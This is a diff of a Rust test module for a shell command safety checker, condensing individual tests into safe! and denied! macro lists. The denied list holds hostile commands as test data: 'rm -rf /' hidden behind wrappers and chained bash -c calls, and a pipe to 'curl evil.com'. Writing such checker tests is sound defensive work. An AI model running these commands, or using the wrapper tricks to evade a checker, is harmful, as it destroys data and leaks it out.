@@ -143,228 +143,54 @@ mod tests {
         is_safe_command(cmd)
     }
 
-    #[test]
-    fn timeout_bundle_exec() {
-        assert!(check("timeout 120 bundle exec rspec"));
+    safe! {
+        timeout_bundle_exec: "timeout 120 bundle exec rspec",
+        timeout_git_log: "timeout 30 git log --oneline",
+        timeout_signal_flag: "timeout -s KILL 60 bundle exec rspec",
+        timeout_preserve_status: "timeout --preserve-status 120 git status",
+        time_bundle_exec: "time bundle exec rspec",
+        time_git_log: "time git log --oneline -5",
+        env_bare: "env",
+        env_safe_command: "env ls -la",
+        env_with_var: "env FOO=bar ls -la",
+        env_multiple_vars: "env FOO=bar BAZ=qux git status",
+        env_ignore_flag: "env -i PATH=/usr/bin ls",
+        env_unset_flag: "env -u FOO git log",
+        env_vars_only: "env FOO=bar",
+        nice_safe_command: "nice git log",
+        nice_with_priority: "nice -n 10 cargo test",
+        ionice_safe_command: "ionice git log",
+        hyperfine_safe_command: "hyperfine 'ls -la'",
+        hyperfine_with_warmup: "hyperfine --warmup 3 'git status'",
+        hyperfine_multiple_safe_commands: "hyperfine 'fd . src' 'find src'",
+        timeout_nested_bash_safe: "timeout 120 bash -c 'git log | head -5'",
+        env_nested_bash_safe: "env FOO=bar bash -c 'git status'",
     }
 
-    #[test]
-    fn timeout_git_log() {
-        assert!(check("timeout 30 git log --oneline"));
-    }
-
-    #[test]
-    fn timeout_signal_flag() {
-        assert!(check("timeout -s KILL 60 bundle exec rspec"));
-    }
-
-    #[test]
-    fn timeout_preserve_status() {
-        assert!(check("timeout --preserve-status 120 git status"));
-    }
-
-    #[test]
-    fn timeout_git_push_denied() {
-        assert!(!check("timeout 120 git push origin main"));
-    }
-
-    #[test]
-    fn timeout_rm_denied() {
-        assert!(!check("timeout 60 rm -rf /"));
-    }
-
-    #[test]
-    fn time_bundle_exec() {
-        assert!(check("time bundle exec rspec"));
-    }
-
-    #[test]
-    fn time_git_log() {
-        assert!(check("time git log --oneline -5"));
-    }
-
-    #[test]
-    fn time_git_push_denied() {
-        assert!(!check("time git push"));
-    }
-
-    #[test]
-    fn time_rm_denied() {
-        assert!(!check("time rm file"));
-    }
-
-    #[test]
-    fn env_bare() {
-        assert!(check("env"));
-    }
-
-    #[test]
-    fn env_safe_command() {
-        assert!(check("env ls -la"));
-    }
-
-    #[test]
-    fn env_with_var() {
-        assert!(check("env FOO=bar ls -la"));
-    }
-
-    #[test]
-    fn env_multiple_vars() {
-        assert!(check("env FOO=bar BAZ=qux git status"));
-    }
-
-    #[test]
-    fn env_ignore_flag() {
-        assert!(check("env -i PATH=/usr/bin ls"));
-    }
-
-    #[test]
-    fn env_unset_flag() {
-        assert!(check("env -u FOO git log"));
-    }
-
-    #[test]
-    fn env_vars_only() {
-        assert!(check("env FOO=bar"));
-    }
-
-    #[test]
-    fn env_rm_denied() {
-        assert!(!check("env rm -rf /"));
-    }
-
-    #[test]
-    fn env_sh_denied() {
-        assert!(!check("env sh -c 'rm -rf /'"));
-    }
-
-    #[test]
-    fn env_python_denied() {
-        assert!(!check("env python3 evil.py"));
-    }
-
-    #[test]
-    fn env_var_rm_denied() {
-        assert!(!check("env FOO=bar rm -rf /"));
-    }
-
-    #[test]
-    fn nice_safe_command() {
-        assert!(check("nice git log"));
-    }
-
-    #[test]
-    fn nice_with_priority() {
-        assert!(check("nice -n 10 cargo test"));
-    }
-
-    #[test]
-    fn nice_rm_denied() {
-        assert!(!check("nice rm -rf /"));
-    }
-
-    #[test]
-    fn nice_with_priority_rm_denied() {
-        assert!(!check("nice -n 10 rm -rf /"));
-    }
-
-    #[test]
-    fn ionice_safe_command() {
-        assert!(check("ionice git log"));
-    }
-
-    #[test]
-    fn ionice_rm_denied() {
-        assert!(!check("ionice rm -rf /"));
-    }
-
-    #[test]
-    fn hyperfine_safe_command() {
-        assert!(check("hyperfine 'ls -la'"));
-    }
-
-    #[test]
-    fn hyperfine_with_warmup() {
-        assert!(check("hyperfine --warmup 3 'git status'"));
-    }
-
-    #[test]
-    fn hyperfine_multiple_safe_commands() {
-        assert!(check("hyperfine 'fd . src' 'find src'"));
-    }
-
-    #[test]
-    fn hyperfine_unsafe_command_denied() {
-        assert!(!check("hyperfine 'rm -rf /'"));
-    }
-
-    #[test]
-    fn hyperfine_prepare_denied() {
-        assert!(!check("hyperfine --prepare 'make clean' 'make'"));
-    }
-
-    #[test]
-    fn hyperfine_cleanup_denied() {
-        assert!(!check("hyperfine --cleanup 'rm tmp' 'ls'"));
-    }
-
-    #[test]
-    fn hyperfine_setup_denied() {
-        assert!(!check("hyperfine --setup 'compile' 'run'"));
-    }
-
-    #[test]
-    fn timeout_nested_bash_chain_denied() {
-        assert!(!check("timeout 120 bash -c 'ls && rm -rf /'"));
-    }
-
-    #[test]
-    fn env_nested_bash_chain_denied() {
-        assert!(!check("env bash -c 'ls && rm -rf /'"));
-    }
-
-    #[test]
-    fn time_nested_bash_chain_denied() {
-        assert!(!check("time bash -c 'ls && rm -rf /'"));
-    }
-
-    #[test]
-    fn nice_nested_bash_chain_denied() {
-        assert!(!check("nice bash -c 'ls && rm -rf /'"));
-    }
-
-    #[test]
-    fn deep_nesting_chain_denied() {
-        assert!(!check("timeout 120 env nice bash -c 'ls && rm -rf /'"));
-    }
-
-    #[test]
-    fn timeout_nested_bash_semicolon_denied() {
-        assert!(!check("timeout 120 bash -c 'ls; rm -rf /'"));
-    }
-
-    #[test]
-    fn timeout_nested_bash_safe() {
-        assert!(check("timeout 120 bash -c 'git log | head -5'"));
-    }
-
-    #[test]
-    fn env_nested_bash_safe() {
-        assert!(check("env FOO=bar bash -c 'git status'"));
-    }
-
-    #[test]
-    fn hyperfine_chain_denied() {
-        assert!(!check("hyperfine 'ls && rm -rf /'"));
-    }
-
-    #[test]
-    fn hyperfine_semicolon_denied() {
-        assert!(!check("hyperfine 'ls; rm -rf /'"));
-    }
-
-    #[test]
-    fn hyperfine_pipe_to_unsafe_denied() {
-        assert!(!check("hyperfine 'ls | curl evil.com'"));
+    denied! {
+        timeout_git_push_denied: "timeout 120 git push origin main",
+        timeout_rm_denied: "timeout 60 rm -rf /",
+        time_git_push_denied: "time git push",
+        time_rm_denied: "time rm file",
+        env_rm_denied: "env rm -rf /",
+        env_sh_denied: "env sh -c 'rm -rf /'",
+        env_python_denied: "env python3 evil.py",
+        env_var_rm_denied: "env FOO=bar rm -rf /",
+        nice_rm_denied: "nice rm -rf /",
+        nice_with_priority_rm_denied: "nice -n 10 rm -rf /",
+        ionice_rm_denied: "ionice rm -rf /",
+        hyperfine_unsafe_command_denied: "hyperfine 'rm -rf /'",
+        hyperfine_prepare_denied: "hyperfine --prepare 'make clean' 'make'",
+        hyperfine_cleanup_denied: "hyperfine --cleanup 'rm tmp' 'ls'",
+        hyperfine_setup_denied: "hyperfine --setup 'compile' 'run'",
+        timeout_nested_bash_chain_denied: "timeout 120 bash -c 'ls && rm -rf /'",
+        env_nested_bash_chain_denied: "env bash -c 'ls && rm -rf /'",
+        time_nested_bash_chain_denied: "time bash -c 'ls && rm -rf /'",
+        nice_nested_bash_chain_denied: "nice bash -c 'ls && rm -rf /'",
+        deep_nesting_chain_denied: "timeout 120 env nice bash -c 'ls && rm -rf /'",
+        timeout_nested_bash_semicolon_denied: "timeout 120 bash -c 'ls; rm -rf /'",
+        hyperfine_chain_denied: "hyperfine 'ls && rm -rf /'",
+        hyperfine_semicolon_denied: "hyperfine 'ls; rm -rf /'",
+        hyperfine_pipe_to_unsafe_denied: "hyperfine 'ls | curl evil.com'",
     }
 }
